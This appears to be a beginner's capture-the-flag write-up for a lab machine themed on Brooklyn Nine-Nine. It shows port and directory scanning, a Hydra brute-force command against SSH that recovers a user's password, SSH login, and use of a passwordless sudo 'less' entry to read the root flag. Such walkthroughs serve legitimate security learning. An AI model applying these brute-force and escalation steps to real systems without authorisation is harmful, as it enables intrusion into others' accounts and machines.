# Brooklyn 99

## nmap
```
Port 21 ftp - anonymous allowed
Port 22 ssh
Port 80 http
```
## gobuster
```
/css
/font
/images
/index.html
/internal # provides upload facility with files stored held at /internal/uploads
/js
/server-status

```
## webside
If we view source we can see a comment:
```
<!-- Have you ever heard of steganography? -->
```

So lets download that image and see what it gives us.
```
wget http://10.10.230.236/brooklyn99.jpg
--2020-07-26 11:28:24--  http://10.10.230.236/brooklyn99.jpg
Connecting to 10.10.230.236:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 69685 (68K) [image/jpeg]
Saving to: ‘brooklyn99.jpg’

brooklyn99.jpg               100%[============================================>]  68.05K  --.-KB/s    in 0.09s   

2020-07-26 11:28:24 (762 KB/s) - ‘brooklyn99.jpg’ saved [69685/69685]
```
## steganography

First things first lets just check the .jpg with file and strings in case anything pops out. This shows as corrupted so I will get back to that later if need be.

## ftp

Lets see what we can get on the FTP server. As it is anonymous, I just use the browser to see what files are available. In this case we have a note from Amy to Jake:
```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
From this we can make an assumption that we have two usernames jake and amy, both characters from the series. Also we are assured that Jake's password is a weak one.
Lets try and see what Hydra GUI can do with this for ftp first, using jake as the username and rockyou.txt as the list and then for ssh:

Nothing on the ftp side but success on the ssh:
```
hydra -s 22 -l jake -P /usr/share/wordlists/rockyou.txt -t 16 10.10.230.236
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-26 11:53:44
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.230.236:22/
[22][ssh] host: 10.10.230.236   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-07-26 11:54:19
<finished>
```
## ssh
Now we can logon as Jake.
```
ssh jake@10.10.230.236 
jake@10.10.230.236's pasword:
```
Let's look around. Nothing in Jake's home directory. We can however see two other user directories - Amy and Holt.

**Amy**
I can see that again her home directory is empty, but she does have an .ssh folder. We could look at this later.

**Holt**
This time we can see two files.
1. nano.save
2. user.txt

It we read this we get the answer to Task 1 #1

Now we will check out Jake's sudo -l permissions.

```
sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less

```
This looks interesting. Jake can run /usr/bin/less as root with no password. Lets try and read the root.txt assuming it is where it should be.

```
- Creator : Fsociety2006 --

Congratulations in rooting Brooklyn Nine Nine
Here is the flag: <insertflaghere>

Enjoy!!
```
The comments in the room suggest a few ways to get root, so I will be coming back to try other ways!!
Great room for begineers like myself as well as being a great TV programme!!
